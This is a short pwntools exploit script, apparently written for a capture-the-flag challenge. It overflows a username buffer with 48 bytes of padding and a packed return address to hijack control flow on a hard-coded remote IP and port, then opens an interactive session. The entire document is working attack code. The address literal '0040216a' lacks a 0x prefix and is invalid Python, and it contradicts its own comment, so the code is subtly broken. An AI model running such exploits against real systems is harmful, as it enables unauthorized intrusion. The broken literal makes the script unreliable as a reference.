from pwn import *

# Context tells pwntools the architecture (64-bit Linux)
context.update(arch='amd64', os='linux')

# Connect to the target
r = remote("80.158.43.220",8085)

# 1. Handle the Username Prompt (The Overflow)
r.recvuntil(b"username > ")

# Define the address of the menu function you found in Ghidra
# Replace 0x401234 with the actual address from your binary!
target_function_address = 0040216a  

# Build the payload:
# 40 bytes to fill the buffer + 8 bytes to fill the saved frame pointer = 48 bytes total padding
payload = b"A" * 48 
payload += p64(target_function_address) # Packs the 64-bit address cleanly into raw bytes

# Send the malicious username payload
r.sendline(payload)

# 2. Handle the Password Prompt (Send anything clean just to pass it)
r.recvuntil(b"password > ")
r.sendline(b"B")

# If successful, login() will return, jump directly to your function, and print the menu!
r.interactive()
